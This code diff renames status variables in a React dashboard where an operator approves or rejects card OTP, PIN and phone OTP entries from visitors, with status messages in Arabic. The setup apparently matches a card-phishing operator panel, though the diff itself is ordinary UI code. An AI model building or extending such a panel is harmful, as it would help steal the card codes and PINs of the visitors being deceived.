@@ -1814,12 +1814,12 @@ export default function DashboardPage() {
         )}
         
         {/* Status message */}
-        {effectiveCardOtpStatus === "approved" && (
+        {otpStatus === "approved" && (
           <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
             <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ موافق - العميل يُوجه للخطوة التالية</p>
           </div>
         )}
-        {effectiveCardOtpStatus === "rejected" && (
+        {otpStatus === "rejected" && (
           <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 12 }}>
             <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض - العميل يجب أن يُعيد إدخال الرمز</p>
           </div>
@@ -1869,13 +1869,13 @@ export default function DashboardPage() {
 
     // NEW: Get timestamp from boxTimestamps state (real-time system)
     const pinTimestamp = boxTimestamps?.pin?.event_timestamp;
-    const pinStatus = boxTimestamps?.pin?.status || effectivePinStatus;
+    const pinBoxStatus = boxTimestamps?.pin?.status || effectivePinStatus;
 
     return (
       <div 
         data-box-type="pin"
         data-visitor-id={selectedRequestId}
-        data-status={pinStatus || 'pending'}
+        data-status={pinBoxStatus || 'pending'}
         style={{ 
           background: "#ffffff", 
           borderRadius: 12, 
@@ -1917,12 +1917,12 @@ export default function DashboardPage() {
         </div>
         
         {/* Status messages */}
-        {effectivePinStatus === "approved" && (
+        {pinBoxStatus === "approved" && (
           <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
             <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ موافق - العميل يُوجه للتحقق من الهاتف</p>
           </div>
         )}
-        {effectivePinStatus === "rejected" && (
+        {pinBoxStatus === "rejected" && (
           <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 12 }}>
             <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض - العميل يجب أن يُعيد إدخال الرمز</p>
           </div>
@@ -2076,15 +2076,16 @@ export default function DashboardPage() {
           </div>
         )}
 
+        	
         {/* Status message - show ONLY when approved */}
-        {effectivePhoneOtpStatus === "approved" && (
+        {phoneStatus === "approved" && (
           <div style={{ background: "#dcfce7", borderRadius: 8, padding: 8, border: "1px solid #86efac" }}>
             <p style={{ margin: 0, fontSize: "0.8rem", color: "#166534", fontWeight: 600 }}>✅ تمت الموافقة - العميل يُوجه للصفحة التالية</p>
           </div>
         )}
 
         {/* Status message - show ONLY when rejected */}
-        {effectivePhoneOtpStatus === "rejected" && (
+        {phoneStatus === "rejected" && (
           <div style={{ background: "#fee2e2", borderRadius: 8, padding: 8, border: "1px solid #fca5a5" }}>
             <p style={{ margin: 0, fontSize: "0.8rem", color: "#991b1b", fontWeight: 600 }}>❌ تم الرفض - العميل سيُعيد المحاولة</p>
           </div>
